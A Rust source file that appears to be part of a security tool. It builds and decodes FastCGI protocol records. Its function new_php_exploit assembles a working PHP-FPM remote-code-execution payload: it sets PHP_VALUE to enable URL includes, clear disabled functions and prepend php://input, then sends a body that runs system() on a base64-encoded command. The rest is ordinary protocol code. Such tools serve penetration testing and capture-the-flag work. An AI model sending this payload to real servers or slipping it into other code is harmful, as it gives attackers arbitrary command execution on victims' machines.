//! FastCGI protocol record implementation

use anyhow::{anyhow, Result};
use base64::{engine::general_purpose::STANDARD, Engine};

/// FastCGI record types
#[repr(u8)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RecordType {
    BeginRequest = 1,
    AbortRequest = 2,
    EndRequest = 3,
    Params = 4,
    Stdin = 5,
    Stdout = 6,
    Stderr = 7,
    Data = 8,
    GetValues = 9,
    GetValuesResult = 10,
    UnknownType = 11,
}

impl From<u8> for RecordType {
    fn from(v: u8) -> Self {
        match v {
            1 => RecordType::BeginRequest,
            2 => RecordType::AbortRequest,
            3 => RecordType::EndRequest,
            4 => RecordType::Params,
            5 => RecordType::Stdin,
            6 => RecordType::Stdout,
            7 => RecordType::Stderr,
            8 => RecordType::Data,
            9 => RecordType::GetValues,
            10 => RecordType::GetValuesResult,
            _ => RecordType::UnknownType,
        }
    }
}

/// FastCGI roles
#[repr(u16)]
#[derive(Debug, Clone, Copy)]
#[allow(dead_code)]
pub enum Role {
    Responder = 1,
    Authorizer = 2,
    Filter = 3,
}

/// FastCGI record structure
#[derive(Debug)]
pub struct FastCGIRecord {
    pub records: Vec<Vec<u8>>,
}

impl FastCGIRecord {
    /// Create a name-value pair for FastCGI params
    fn name_value_pair(name: &str, value: &str) -> Vec<u8> {
        let name_bytes = name.as_bytes();
        let value_bytes = value.as_bytes();
        let name_len = name_bytes.len();
        let value_len = value_bytes.len();

        let mut result = Vec::new();

        // Name length (1 or 4 bytes)
        if name_len < 128 {
            result.push(name_len as u8);
        } else {
            result.push(((name_len >> 24) | 0x80) as u8);
            result.push((name_len >> 16) as u8);
            result.push((name_len >> 8) as u8);
            result.push(name_len as u8);
        }

        // Value length (1 or 4 bytes)
        if value_len < 128 {
            result.push(value_len as u8);
        } else {
            result.push(((value_len >> 24) | 0x80) as u8);
            result.push((value_len >> 16) as u8);
            result.push((value_len >> 8) as u8);
            result.push(value_len as u8);
        }

        result.extend_from_slice(name_bytes);
        result.extend_from_slice(value_bytes);
        result
    }

    /// Create a FastCGI record
    fn make_record(record_type: RecordType, request_id: u16, content: &[u8]) -> Vec<u8> {
        let content_length = content.len();
        let mut record = Vec::with_capacity(8 + content_length);

        // Header (8 bytes)
        record.push(1); // Version
        record.push(record_type as u8); // Type
        record.push((request_id >> 8) as u8); // Request ID B1
        record.push(request_id as u8); // Request ID B0
        record.push((content_length >> 8) as u8); // Content Length B1
        record.push(content_length as u8); // Content Length B0
        record.push(0); // Padding Length
        record.push(0); // Reserved

        // Content
        record.extend_from_slice(content);
        record
    }

    /// Create a new FastCGI record for PHP exploitation
    pub fn new_php_exploit(filename: &str, command: &str, request_id: u16) -> Self {
        // Base64 encode the command for safer execution
        let cmd_encoded = STANDARD.encode(command.as_bytes());
        let body = format!("<?php system(base64_decode('{cmd_encoded}'));?>");

        let env: Vec<(&str, String)> = vec![
            ("SERVER_SOFTWARE", "virzz - fcgiclient".to_string()),
            ("REMOTE_ADDR", "127.0.0.1".to_string()),
            ("SERVER_PROTOCOL", "HTTP/1.1".to_string()),
            ("CONTENT_LENGTH", body.len().to_string()),
            ("REQUEST_METHOD", "POST".to_string()),
            ("SCRIPT_FILENAME", filename.to_string()),
            (
                "PHP_VALUE",
                "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input"
                    .to_string(),
            ),
            ("DOCUMENT_ROOT", "/".to_string()),
        ];

        Self::new(env, body.as_bytes(), request_id)
    }

    /// Create a new FastCGI record with custom environment
    pub fn new(env: Vec<(&str, String)>, data: &[u8], request_id: u16) -> Self {
        let mut records = Vec::new();

        // Begin request record
        let begin_content = [0, Role::Responder as u8, 0, 0, 0, 0, 0, 0];
        records.push(Self::make_record(
            RecordType::BeginRequest,
            request_id,
            &begin_content,
        ));

        // Params records
        for (key, value) in env {
            let param = Self::name_value_pair(key, &value);
            records.push(Self::make_record(RecordType::Params, request_id, &param));
        }

        // Empty params record to end params
        records.push(Self::make_record(RecordType::Params, request_id, &[]));

        // Stdin record with data
        records.push(Self::make_record(RecordType::Stdin, request_id, data));

        // Empty stdin record to end input
        records.push(Self::make_record(RecordType::Stdin, request_id, &[]));

        Self { records }
    }

    /// Convert to bytes
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut result = Vec::new();
        for record in &self.records {
            result.extend_from_slice(record);
        }
        result
    }

    /// Decode FastCGI records from bytes
    pub fn decode(data: &[u8]) -> Result<String> {
        let mut result = String::new();
        let mut offset = 0;

        while offset + 8 <= data.len() {
            let version = data[offset];
            let record_type = RecordType::from(data[offset + 1]);
            let request_id = ((data[offset + 2] as u16) << 8) | (data[offset + 3] as u16);
            let content_length =
                ((data[offset + 4] as usize) << 8) | (data[offset + 5] as usize);
            let padding_length = data[offset + 6] as usize;

            if offset + 8 + content_length + padding_length > data.len() {
                return Err(anyhow!("Invalid record: content extends beyond data"));
            }

            let content = &data[offset + 8..offset + 8 + content_length];

            result.push_str(&format!(
                "Record {{ version: {version}, type: {record_type:?}, request_id: {request_id}, content_length: {content_length} }}\n"
            ));

            // Decode params content
            if record_type == RecordType::Params && !content.is_empty() {
                if let Ok(params) = Self::decode_params(content) {
                    for (key, value) in params {
                        result.push_str(&format!("  {key} = {value}\n"));
                    }
                }
            } else if record_type == RecordType::Stdin && !content.is_empty() {
                if let Ok(s) = std::str::from_utf8(content) {
                    result.push_str(&format!("  Data: {s}\n"));
                } else {
                    result.push_str(&format!("  Data (hex): {}\n", hex::encode(content)));
                }
            }

            offset += 8 + content_length + padding_length;
        }

        Ok(result)
    }

    /// Decode params from content
    fn decode_params(data: &[u8]) -> Result<Vec<(String, String)>> {
        let mut result = Vec::new();
        let mut offset = 0;

        while offset < data.len() {
            let (name_len, bytes_read) = Self::read_length(data, offset)?;
            offset += bytes_read;

            let (value_len, bytes_read) = Self::read_length(data, offset)?;
            offset += bytes_read;

            if offset + name_len + value_len > data.len() {
                return Err(anyhow!("Invalid param: extends beyond data"));
            }

            let name = String::from_utf8_lossy(&data[offset..offset + name_len]).to_string();
            offset += name_len;

            let value = String::from_utf8_lossy(&data[offset..offset + value_len]).to_string();
            offset += value_len;

            result.push((name, value));
        }

        Ok(result)
    }

    /// Read a length value (1 or 4 bytes)
    fn read_length(data: &[u8], offset: usize) -> Result<(usize, usize)> {
        if offset >= data.len() {
            return Err(anyhow!("Invalid length: offset beyond data"));
        }

        let first_byte = data[offset];
        if first_byte & 0x80 == 0 {
            // 1 byte length
            Ok((first_byte as usize, 1))
        } else {
            // 4 byte length
            if offset + 4 > data.len() {
                return Err(anyhow!("Invalid length: 4-byte length extends beyond data"));
            }
            let len = ((data[offset] & 0x7f) as usize) << 24
                | (data[offset + 1] as usize) << 16
                | (data[offset + 2] as usize) << 8
                | data[offset + 3] as usize;
            Ok((len, 4))
        }
    }
}

impl std::fmt::Display for FastCGIRecord {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", hex::encode(self.to_bytes()))
    }
}

